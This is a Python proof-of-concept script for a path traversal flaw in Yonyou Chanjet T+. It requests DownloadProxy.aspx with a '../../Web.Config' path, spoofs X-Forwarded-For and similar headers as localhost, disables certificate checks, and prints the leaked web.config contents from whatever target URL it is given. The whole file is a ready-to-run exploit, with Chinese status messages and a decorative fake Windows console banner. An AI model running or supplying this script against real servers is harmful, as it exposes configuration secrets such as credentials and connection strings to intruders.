#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    vulurl = site +"/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
    headers={"X-Forwarded-For": "127.0.0.1",
                 "X-Originating" : "127.0.0.1",
                 "X-Remote-IP": "127.0.0.1",
                 "X-Remote-Addr": "127.0.0.1",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                 }
    try:
        resp = requests.get(url=vulurl, verify = False, allow_redirects = False, timeout=5,headers=headers)
        if 'xml' in resp.text and resp.status_code == 200:
            return resp.text[:1000]
    except:
        pass
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 yonyou-chanjet-tplus-read-file.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行读取文件 web.config 的内容结果为：\n", info)
    else:
        print("[-]漏洞不存在")
